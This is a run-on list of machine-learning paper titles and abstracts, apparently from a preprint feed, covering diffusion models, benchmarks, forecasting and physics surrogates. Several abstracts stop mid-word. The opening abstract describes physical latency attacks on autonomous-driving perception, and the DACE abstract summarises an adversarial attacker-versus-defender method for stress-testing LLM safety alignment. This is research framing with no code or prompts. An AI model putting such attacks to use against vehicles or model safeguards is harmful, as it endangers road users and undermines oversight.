abstract: Autonomous Driving (AD) relies heavily on camera-based perception for object detection and multiple object tracking (MOT). Since high latency in these components poses serious safety risks, such as collisions, most prior works have focused on digital-domain latency attacks. A recent study pioneered the study of latency attacks in the physical world using a projector, but its design has not considered attack strategies that can systematically exploit vulnerabilities across the entire AD camera-based perception pipeline—especially MOT—thereby fundamentally limiting its attack capability. title: Decoding Without a Decoder: Direct Pixel Prediction from Diffusion Transformers
abstract: Latent diffusion models rely on a decoder to map denoised latents to pixels, adding complexity and inference cost. We introduce Decoding Without a Decoder (DWD), which lets a finetuned diffusion transformer produce final pixels directly through a linear head. Unlike previous methods, where the denoising output leads to final pixels, DWD separates the two roles: the original denoising head continues to drive sampling, then the new DWD head predicts the pixels at the final step. title: Explaining Cross-Label Decision Structure in Multi-Output Tree Ensembles
abstract: A multi-output tree ensemble predicts several binary labels through decision paths that it largely shares across those labels, yet the attribution methods commonly used to explain such models treat each output in isolation. We propose multi-sink Decision Predicate Graphs (ms-DPGs), which extend decision predicate graphs with one sink per label: each leaf contributes to the sink of every label its in-bag positive count for that label. title: Experts Across Schemas: Agent-Guided Mixture-of-Relational-Experts for Cross-Database Generalization
abstract: Web platforms record user and item activity in relational databases whose schemas differ from platform to platform, which makes it difficult to transfer predictive models between them. Relational foundation models address this through cross-database pretraining, yet recent improvements have relied on increasingly large pretraining corpora. We ask whether a better architecture, together with features specific to the target database, can deliver comparable gains from far less pretraining data. title: Sketching Language Models for Context Attribution
abstract: Context attribution asks how removing parts of a prompt changes a language model's output. We study leave-one-out (LOO) attribution for a prompt of $n$ tokens and a fixed measurement function. Computing all LOO values directly requires $n$ model evaluations. Under a stability assumption, our algorithm estimates all LOO values to error proportional to $\varepsilon$ with constant probability using $O(\sqrt{\log(1/\varepsilon)}/\varepsilon)$ evaluation calls. title: TriGen: A Generative Paradigm for Trigger-Induced Recommendation
abstract: Generative recommendation typically operates under the User-Induced Recommendation (UIR) setting, predicting target items by autoregressively generating semantic IDs as a passive continuation of long-term user history. However, this paradigm overlooks Trigger-Induced Recommendation (TIR), an essential industrial scenario where a user click triggers an immediate follow-up feed. In TIR, recommendations must dynamically align with the instant trigger intent without compromising historical preference continuity. title: Model Distribution-Aware Multimodal Dataset Distillation
abstract: Multimodal dataset distillation (MDD) aims to reduce the cost of vision-language pre-training by synthesizing compact image-text datasets. Although recent feature-matching methods have improved distillation efficiency, synthetic data may become specialized to the model representations encountered during optimization, limiting generalization to unseen model states. We propose Model Distribution-Aware Multimodal Dataset Distillation (MDA-DD), which leverages supervision from a dynamic staggered queue of models at different training stages. title: A tiny object detection dataset for high-altitude open-water search and rescue
abstract: Large aerial platforms often operate above 1.5 km to improve the efficiency of open water search and rescue (OW-SAR). However, long imaging distances, wide fields of view, and limited sensor resolution reduce objects to a few pixels, increasing their susceptibility to environmental interference and making detection harder than for conventional small objects. To our knowledge, existing datasets focus on low-altitude scenarios and do not support automatic detection at 1.5-2.0 km. We therefore present TinyWOD, a tiny object detection dataset for high-altitude OW-SAR using lifebuoys as detection t

title: TyphoonWorld: A Residual Token World Model for Probabilistic Forecasting of Typhoon Imagery
abstract: A satellite forecast of a typhoon should give a low-error picture of the next two days, together with an ensemble whose members are coherent fields and whose spread responds to the storm at hand. A small direct regression network already gives the lowest squared error on held-out storms, so a generative model has to earn its cost through the part of the future that the regression smooths away. We present TyphoonWorld, a discrete-token world model that generates only that part. title: DACE: Diversity-Driven Adversarial Co-Evolution for Robust LLM Safety Alignment
abstract: Ensuring robust safety alignment of large language models (LLMs) is increasingly difficult as adversarial attacks evolve and outpace alignment pipelines built on pre-collected data. Existing co-evolutionary frameworks let the defender chase a moving attacker, yet their training dynamics expose two compounding pathologies: \emph{attack strategy collapse}, where the attacker overfits to a narrow set of high-reward rewrites, and \emph{defense adversarial forgetting}, where the defender loses competence against earlier attacks as the attack distribution drifts. title: Activation Steering the Nan-Shan in Typhoon
abstract: Typhoon is an audiovisual installation based on Joseph Conrad's novella, in which Captain MacWhirr steers the steamer Nan-Shan directly into and through a catastrophic storm. The novella is a study of what happens when the scale of a phenomenon exceeds the practical and conceptual frameworks available to comprehend it and of the paralysis that sometimes follows a demand for action in such overwhelming circumstances. title: Benchmarking Reasoning Reliability,Prior_Evidence Contrast,and Spectral Discrimination in Remote-Sensing Geological Image Interpretation
abstract: Reliable lithology interpretation requires accurate geological recognition and reasoning grounded in visual evidence. Although Multimodal Large Language Models show promise in remote sensing, their reliability in geological interpretation remains unclear. We introduce HyGeoBench, a diagnostic benchmark of 10,000 questions based on hyperspectral imagery across three dimensions: reasoning reliability, prior_evidence contrast, and spectral discrimination. title: Where the Error Lives: Separating Lid-Edge and Body-Induced Error in Neural Pressure Prediction for 3D Cavity Flow
abstract: Can a pressure surrogate score much better globally without better resolving the pressure around immersed bodies? We test this in a three-dimensional lid-driven cavity with an unregularized lid and centered pressure at native $128^3$ resolution. On 60 cases from 12 unseen geometries, with predictions sealed before the CFD truth existed, adding a body-free, Reynolds-conditioned reference correction to the same frozen $64^3$ surrogate lifted to $128^3$ lowers the mean full-volume relative $L_2$ error from 20.6% to 7.5%. title: Reinforcement Learning for Target Jerk Estimation in Interceptor Homing Phase
abstract: We demonstrate the use of reinforcement meta-learning (meta-RL) to optimize a target jerk estimation policy, which is then used as the target acceleration rate of change in the propagation model of an unscented Kalman filter (UKF). The policy is learned through simulated engagements of a terminal phase high-altitude endoatmospheric interception of a highly maneuverable target, with a hit-to-kill accuracy requirement. title: A Study of the PDE Model for the Anisotropic Consensus-Based Optimization
abstract: We investigate the nonlinear Fokker--Planck equation associated with anisotropic consensus-based optimization. Under suitable assumptions on the objective function, we establish global existence and uniqueness of density valued weak solutions for bounded initial probability densities with finite fourth moment. The main analytical challenge arises from the component-wise degeneracy of the diffusion, which vanishes along moving coordinate hyperplanes determined by the weighted consensus point. title: DiscoveryAgent: A Framework for Scientist-centric Agentic AI
abstract: AI agents can assist scientific research, but balancing autonomous investigation with scientists' ability to inspect and redirect ongoing work remains a central design challenge. We present DiscoveryAgent, a domain-agnostic, scientist-centric system that combines autonomous investigation with scientist-directed hypothesis steering. Scientists select, refine, or replace hypotheses between research rounds, while audit agents interrogate checkpointed records to trace claims, reproduce analyses, and inform subsequent decisions. title: TabOmics: A Small, Open Tabular Foundation Model for Wide Omics Data
abstract: Omics studies often produce tables with thousands to tens of thousands of molecular features and few samples. Tabular foundation models use diverse strategies to predict labels for such tables, with some relying on in-context learning, while approaches to wide tables may involve subsampling, grouping, or compressing features. We present TabOmics, a small, open family of tabular foundation models with 7.3M parameters, pretrained exclusively on synthetic tables. title: Generative AI-Driven Parametric Design Optimization Framework for Vehicle Closure Systems
abstract: This study presents a generative AI-driven parametric design optimization framework integrating performance-oriented generation with editable computer-aided design (CAD) and downstream computer-aided engineering (CAE) analysis for industrial vehicle closure systems. The framework is demonstrated on an automotive tailgate assembly with complex geometry, coupled components, and competing performance and feasibility requirements. title: A Temporal Algebraic Framework for Data Stream Evaluation Under Delayed Labels and Distribution Shifts
abstract: In data streams, labels often arrive late or only for some instances, class prevalence drifts, and rare classes vanish from short windows. Standard evaluation then confuses a degraded decision boundary with a change in prevalence, and is biased when labels are delayed or selected by the model. title: PiLLVD: A Real-World Low-Light Video Dataset for Dynamic Scenes Captured with Off-the-Shelf Cameras
abstract: Low-light image and video enhancement has received increasing attention in recent years. However, most existing enhancement methods are developed and evaluated on still images, while progress in low-light video enhancement remains limited by the lack of real-world paired video datasets. Acquiring paired low-light and normal-light video sequences is challenging because it requires spatially and temporally aligned captures while avoiding motion blur, exposure mismatch, and correspondence errors in dynamic scenes. title: SR-Agent: An Advanced Intelligent Agent for Seismic Data Restoration
abstract: Field seismic data often suffer from multiple degradations, including noise contamination, incomplete geometry, low-frequency loss, and reduced spatial resolution, requiring different restoration operations. Existing methods mainly address individual degradations, while sequential application of task-specific models often relies on human experience. Although all-in-one models integrate multiple restoration tasks, they face a trade-off between generalization and task-specific accuracy. title: Jeveration: System One Models Now Generate
abstract: System One models such as Jev return decisions through fast, parallel prediction. In this paper, we introduce Jeveration, showing that the same decision paradigm can also generate high-quality images in a single forward pass. Jeveration builds on a frozen vision-language model, repurposing its visual-semantic knowledge for holistic image generation. The key challenge is to maintain global consistency. title: MuSeToM: Multi-Sensory Evaluation of Belief Revision with Textual Cues Across Six Senses
abstract: Theory of Mind (ToM), the ability to infer mental states in others, is pivotal for human social cognition. Existing evaluations of ToM in large language models (LLMs) mainly focus on static belief attribution and false-belief reasoning, leaving a critical aspect of social reasoning underexplored: can LLMs decide whether perceptual evidence is sufficient to justify another person's belief revision? institutions: Hong Kong University of Science and Technology

title: TwinLab-Bench: Evaluating AI Scientists in Agentic Twins of Real Labs
abstract: AI agents are increasingly expected to act as AI scientists, which requires three increasingly open abilities: carrying out a given computational workflow correctly, choosing the next measurements from a given design space, and designing their own experiments. Existing benchmarks mainly evaluate the first two abilities, in a terminal or in a closed loop that selects from predefined candidates. Evaluating the third ability requires reliably executing an experiment that an agent designs, with readings grounded in a real laboratory. title: SARGO: Agreement-Gated Reinforcement and Suppression via On-Policy Self-Guidance for Visual Hallucination Mitigation
abstract: Vision-language models remain susceptible to visual hallucinations, often mixing grounded information with unsupported claims in the same response. Response-level reinforcement learning assigns a shared advantage to all tokens in a response, causing negative updates to suppress correct information alongside unsupported claims. To reduce hallucination while preserving useful visual information, we introduce SARGO (Self-guided Advantage-Routed Grounding Optimization), a post-training framework for selective reinforcement and suppression through on-policy self-guidance. title: Pluggable Subband-Decoupled Fusion and Unlabeled Capture Prototype Calibration: Bridging High-SNR Null-Subcarrier Regrowth and Low-SNR Coherent Preambles for Cross-Domain IoT RF Fingerprinting
abstract: Zero-overhead physical-layer authentication at edge wireless access points (APs) is vital for securing resource-constrained Internet of Things (IoT) transceivers against credential cloning, yet cross-domain IEEE 802.11a/g radio frequency fingerprint identification (RFFI) faces an acute signal-to-noise ratio (SNR) crossover. title: Does Your World Model Know Actions Have Consequences?
abstract: Embodied world models (WMs) are implicit learning systems that predict the next future latent state directly from observations and actions. Unique from other end-to-end learning systems, the dynamics predictor of WMs can simulate the environment's response to alternative actions without physical deployment nor pre-specifying states of the dynamical system. Current metrics focus on the quality of model outputs, e.g., clarity of reconstructions or task success, but fail to assess the fidelity of modeling consequences of counterfactual actions. Inspecting the forced response to action perturbatio

title: Large Payments Model
abstract: Payment applications such as fraud detection, authorization prediction, and payment optimization draw on overlapping transaction information. This motivates a reusable payments intelligence layer that shares learned representations and predictive signals, rather than developing predictive models independently for each task. Realizing this shared capability requires handling heterogeneous transaction fields, high-cardinality identifiers, lifecycle-dependent attributes, long histories, and rare outcomes while meeting latency and cost constraints. We present Large Payments Model (LPM), a domain-s

title: Attention Drift Regularization with Adaptive Initialization for Domain-Robust Visual Recognition
abstract: Source-free domain adaptation (SFDA) adapts a pretrained source model to unlabeled target domains without source data access, yet two critical failure modes remain unaddressed. First, attention drift: source-learned attention maps shift toward spurious or background features under distribution shift, destabilizing feature representations. Second, domain-gap-agnostic initialization: applying a single fixed source model uniformly across all target domains ignores domain gap severity, causing premature overfitting to noisy pseudo-labels under large shifts. We propose DGA-CAFC to address both fail
institutions: Indian Institute of Science Education and Research, Bhopal

title: CRA: Continuous Risk Assessment for Safety-critical Visual Navigation
abstract: Traditional safety-critical control methods often rely on predefined constraints that separate states into safe and unsafe regions. While recent studies have extended geometric safety toward semantic safety, real-world safety is rarely purely binary. The risk associated with an object or human can vary continuously with its physical properties, like motion, and interaction context; for example, a person carrying a heavy object or a hot object moving at high speed may require a different safety response from an ordinary static obstacle. title: A probabilistic analysis of the Brumadinho tailings dam-breach using uncertainty quantification and global sensitivity analysis
abstract: On 25th January 2019, Dam B1 in Brumadinho, Brazil, suddenly collapsed and produced a catastrophic tailings flow with severe human, environmental and infrastructural consequences. Previous numerical back-analyses of the tailings flow have relied on deterministic approaches, which provide useful reference results but do not explicitly incorporate uncertainty associated to rupture hydrograph and tailings' physical properties. This work presents a probabilistic approach to study the tailings dam-breach flow caused by the rupture of Dam B1, focusing on the quantification and interpretation of the
institutions: Institut National des Sciences Appliquées de Toulouse

title: Moving Generality from Model to Modeler: LLM Agents for PHM on a Deployment-Style Benchmark
abstract: Coding agents built on large language models (LLMs) now help develop many models published as general solutions. Should generality instead reside in the agent that builds a model for each new task? We examine this question in prognostics and health management (PHM), where every model must work on unseen equipment. Our deployment-style benchmark, NextUnit-Bench, covers 24 public datasets split into 58 folds that hold out units or operating conditions; each agent has two hours to deliver an executable predictor, then run on the hidden units. title: The Cybersecurity Dataset Observatory: Which Data for AI in Cybersecurity?
abstract: AI is increasingly used for cybersecurity tasks such as intrusion and malware detection, in enterprise, industrial, vehicular and mobile networks. Its effectiveness depends on data: models need representative network traffic, both to be trained and to be evaluated realistically. Public datasets of cybersecurity network traffic, however, are scattered across laboratory pages, repositories and aggregators, and are continuously released, corrected and withdrawn: 92 of the 234 datasets we catalog were released in 2023 or later. At this pace, surveys that list them are outdated soon after publicati

title: The Window Lever: Longer Observation Windows Outweigh the Observed Effects of Data, Capacity, and Architecture in Customer Behavior Forecasting
abstract: In our experiments on long-horizon customer-behavior forecasting, a longer observation window outweighed the observed effects of more data, more capacity and newer architectures. The window is the weeks of history a model sees before the week it forecasts from. Going from an 8- to a 16-week window adds a raw +0.070 to 0.107 log-space $R^2$ in every family at 1M. Matched test cohorts, which score the same customer-weeks at every window, show this raw comparison understates the gain in every family they cover. title: Machine-learned acceleration of earthquake sequence simulations
abstract: Earthquake sequence simulations involve slow interseismic processes and rapid dynamic ruptures. During interseismic periods, a numerical solver can take large time steps efficiently. During seismic periods, in contrast, the solver must drastically reduce the time step, and elastodynamic wave-mediated memory effects become significant; long-term simulations are therefore computationally expensive. We investigate the use of neural operators to accelerate earthquake sequence simulations. title: FG-GraphBench: Benchmarking and Enhancing Fine-Grained Visual Understanding with Multimodal Scene Graphs
abstract: Fine-grained visual understanding requires multimodal large language models (MLLMs) to recognize small visual entities and understand their relationships. Scene graphs offer a natural way to represent this information, organizing visual entities as nodes and their relationships as edges. However, we identify two challenges: existing scene graph benchmarks provide insufficient coverage of fine-grained entities and the relationships among them, and existing methods for fine-grained visual understanding have yet to effectively leverage such graph-structured information in MLLMs. To address these

Beijing Research Institute of Mechanical and Electrical Technology

title: Harmonic structure and parametric prediction of instantaneous power in oscillating foils
abstract: A closed-form model is developed to predict the instantaneous lift, pitching moment, and power of an oscillating-foil energy harvester directly from its kinematic input. Such foils extract renewable power from moving water through sinusoidal heaving and pitching. However, due to their large-amplitude motion and vortex-dominated dynamics, classical unsteady aerodynamics cannot accurately predict the time-dependent force and power generation. title: AeroZoo: A Benchmark of Well-Posed Flow Problems for Foundation Models of Aerodynamics
abstract: Neural surrogates for computational fluid dynamics (CFD) are trained and ranked on datasets that each vary one design family in one flow domain. Such datasets cannot test the least that an aerodynamic foundation model must do: predict CFD-quality incompressible flow in seconds for new shapes in new enclosures. On DrivAerML, larger models and longer training barely lower Transolver's error; doubling the training cases cuts it by about 12% up to 400 cases, exhausting the dataset. title: "I don't know what I don't know": Exploring the Benefits and Challenges of AI in Interdisciplinary Research
abstract: Interdisciplinary research is widely lauded as beneficial for society but presents unique challenges to the researchers who bridge disciplinary boundaries. Despite the rapid increase in the availability and usage of AI systems for research tasks, there is little work studying how AI systems have impacted workflows that span unfamiliar disciplines. Through a survey ($N=62$) and follow-up interviews ($N=23$) with interdisciplinary researchers, we describe the unique challenges and opportunities for AI in interdisciplinary research workflows. Participants viewed AI both as a solution and exacerba

title: REWEAVE: Online Learning for Workload-Adaptive HNSW Indexes
abstract: Vector databases rely on Hierarchical Navigable Small World (HNSW) indexes for similarity search, but a graph built from data alone can be poorly matched to a skewed or changing query workload. We present REWEAVE (Reward-Guided Rewiring of Vector Graphs), an online index-maintenance method that learns edge utility from query feedback and periodically rewires the bottom layer within the original per-node degree cap. institutions: The University of Texas at Arlington

title: SpotDiff: A Plug-and-Play Framework for Zero-Shot Change Detection in Remote Sensing Imagery
abstract: Remote sensing change detection usually relies on large collections of temporally aligned, pixel-level annotations, which limits its scalability across regions, imaging platforms and application domains. Recent zero-shot approaches reduce the need for supervision, but they often localize fine-grained changes poorly because their features are coarse or inconsistent across time. We present SpotDiff, a training-free, plug-and-play framework for zero-shot change detection built by composing complementary vision foundation models. SpotDiff uses DINOv3 for semantically robust features, AnyUp to reco

title: XLSAR-Bench: Towards Extremely Large SAR Imagery Understanding of MLLMs
abstract: The rapid development of multimodal large language models (MLLMs) has highlighted the need for comprehensive benchmarks to assess their capabilities and limitations in remote sensing (RS). However, evaluating MLLMs in large-size synthetic aperture radar (SAR) scenarios remains challenging, as understanding complete scenes requires both global semantic interpretation and fine-grained target perception. Existing SAR benchmarks predominantly rely on small image patches, limiting their ability to assess these capabilities jointly. To address these limitations, we present XLSAR-Bench, a comprehensi

title: Diagnosing and Correcting Skin-Tone Color Casts in Ultra-Lightweight Photo Retouching Networks
abstract: Color casts are expected to come from the scene or camera, and a retouching model removes them. We report a case where the model leaves one: an ultra-lightweight retouching network renders human skin greener than the original because it under-restores the skin chroma that a degradation removes and, even on clean inputs, adds a small hue shift of its own. A common paired-data-free recipe, synthetic self-supervision (degrade high-quality images, learn to restore them), silently produces this cast while whole-frame PSNR/SSIM stay essentially unchanged. title: CLADE: Category-Level Answering from Deficient Evidence in Retrieval-Augmented Language Models
abstract: Retrieval-augmented systems often retrieve passages that are accurate and relevant but state the answer at a coarser level of granularity than the question requires. For example, a question may ask which specific disease a drug treats (familial hyperlipidemia), while the retrieved passage mentions the broader disease family (hyperlipidemia). Prior work on context sufficiency treats such coarse passages simply as insufficient. title: KnowVis: Dual-View Evaluation and Diagnosis of World-Knowledge Grounding in Text-to-Image Models
abstract: Text-to-image (T2I) models have made substantial progress in visual realism, aesthetic quality, and instruction following. However, real-world prompts often go beyond explicit visual descriptions and require implicit facts, structured knowledge, and domain-specific commonsense. Existing evaluations mainly focus on explicit prompt-to-image semantic alignment or specific knowledge subdomains, lacking unified evaluation and diagnosis of world-knowledge grounding in T2I models. title: Evidence from a Multi-Regime Causal Discovery Benchmark: UCMT Algorithms, Comparative Performance, and Controlled Ablation Studies
abstract: We present an internal, pre-registered evaluation of the UCMT causal discovery algorithm family alongside established alternatives across heterogeneous benchmark regimes, complemented by a separately pre-registered, controlled study of UCMT v2 Global components. The contribution is both empirical and methodological: a family-stratified comparison of three actively developed algorithm configurations and targeted evidence about which internal stages affect their outcomes. title: Predicting the Needle in a Petabyte Scale Haystack: Open-Vocabulary Event Anticipation in Satellite Imagery
abstract: Satellite constellations now image the Earth daily, capturing the lifecycle of events from deforestation to urban construction. Anticipating these events before completion enables timely intervention, yet existing systems cannot jointly identify where a change occurs, what it will become, and when it will finish across an open vocabulary. Building such a model requires diverse event data, but events are like needles in a haystack, making manual annotation at global scale infeasible. We address this problem by representing change as the vector difference between vision-language model embeddings

title: Detection and Classification in Latent Spaces: High-Dimensional Analysis and Validation
abstract: Foundation models produce high-dimensional latent representations in which suitably designed statistical decision rules can be effective yet analytically tractable. We study such detectors in the high-dimensional regime, where latent dimension and training sample size grow proportionally. For linear and quadratic statistics, we derive explicit large-deviation characterizations of false-alarm and miss-detection performance under the Neyman-Pearson paradigm, and show how the binary analysis extends to multi-class classification. institutions: NATO Centre for Maritime Research and Experimentation

title: A Synthetic Benchmark for Target-Centric Causal Discovery in Industrial Processes
abstract: Causal discovery promises to find which recorded variables drive a process target such as product quality, yield or energy use. Process data with known causes are rare, and in existing benchmarks the difficulty of identifying the causes of a target is either fixed by the recorded data or set for the whole graph. We present a synthetic benchmark for target-centric causal discovery in industrial processes. title: The Critic Can Hurt: On the Safety of Critics in LLM-Guided AutoML Search
abstract: LLM critics increasingly steer iterative search in agentic AutoML, prompt optimization, and self-refinement--evaluated for whether they help, but rarely for whether they can hurt. We isolate the critic's marginal effect through a four-arm audit and characterize the loop's tolerance through controlled fault injection. We show a naive 8B critic drives search below the no-critic random-search floor on 7 of 8 tabular datasets, losing up to 0.245 AUC in the worst case; the magnitude varies strongly with dataset, frontier, and budget. title: Partial recovery of meter-scale surface weather
abstract: Near-surface weather varies over tens to hundreds of meters, yet remains unresolved in analyses and forecasts. We test whether this variation can be inferred without resolving atmospheric dynamics. Combining sparse weather stations, high-resolution Earth observation, and coarse atmospheric dynamics, we infer temperature, dewpoint, and wind at 30-m resolution across the contiguous United States. Against measurements held out in space and time, estimates reduce error by 11-28% relative to the strongest baseline. title: State-Message Interaction Adapter for Cross-Domain Few-Shot Segmentation
abstract: Cross-domain few-shot segmentation adapts natural-image pretrained encoders to medical or industrial domains from a few pixel-annotated support masks. Within frozen DINOv3, intermediate per-head attention messages already carry target-background distinctions that baseline final-layer similarities and predictions do not consistently reflect. We propose the State-Message Interaction Adapter (SMIA) to learn how per-head messages should update each receiving token representation while keeping pretrained attention and FFN parameters frozen. institutions: University of Shanghai for Science and Technology

title: Chain of Physics: Supporting Fault Diagnosis with Engineering-Inspired Large Language Model Reasoning
abstract: Fault diagnosis in complex systems requires linking observed changes in physical quantities to the failure mechanisms that produce them. Experienced engineers perform this task by combining sensor information with knowledge of system behavior and fault propagation. Large Language Models (LLMs) can support this process, but their diagnostic reasoning depends on the availability of asset-specific engineering knowledge and on how this knowledge is represented and used during inference. This work introduces Chain of Physics (CoP), an LLM-based fault-diagnosis framework built around a Constrained K
institutions: ZHAW Zurich University of Applied Sciences

title: PhysICL: In-Context Learning of Physical Fields on Unstructured Meshes from Procedural Priors
abstract: Engineering design studies produce a few tens to a few hundred simulations of one problem, each on its own mesh, and their surrogates are retrained for every study. Tabular foundation models instead infer a new task from its examples in one forward pass, after pretraining on synthetic tasks. We demonstrate the feasibility of in-context learning for physical field prediction on unstructured meshes. A single model, PhysICL, pretrained solely on procedural tasks, predicts fields, with quantiles, directly on each query mesh from labeled simulations, without updating its weights. title: Neural Operator Approximation for Yau--Yau Nonlinear Filtering: Stability, Approximation, and Fast Computation
abstract: Since the introduction of the Kalman filter, nonlinear state estimation has become an important topic in areas such as aerospace engineering, sensor design, and target tracking. Within the optimal filtering framework described by the Duncan-Mortensen-Zakai (DMZ) equation, Yau-Yau filtering (YYF) employs an offline-online decomposition: the Fokker-Planck-Kolmogorov (FKE) equations, initialized by a prescribed set of basis functions, are solved offline, and the prior density is projected onto these basis functions during the online stage.
